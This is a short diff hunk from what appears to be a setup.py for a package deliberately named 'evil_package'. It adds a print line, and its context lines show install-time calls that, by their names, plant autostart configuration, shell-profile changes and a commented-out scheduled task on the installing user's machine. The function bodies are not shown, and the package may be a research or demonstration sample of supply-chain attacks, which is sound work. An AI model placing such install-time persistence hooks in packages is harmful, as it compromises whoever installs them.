@@ -38,6 +38,7 @@ drop_config_autostart(platform_str, username)  # todo test lin
 drop_profile_modification(platform_str, username)  # todo test lin
 #drop_schtask_autostart(platform_str)  # todo win
 
+print("INFO: Package activity finished.")
 
 setup(
     name='evil_package',
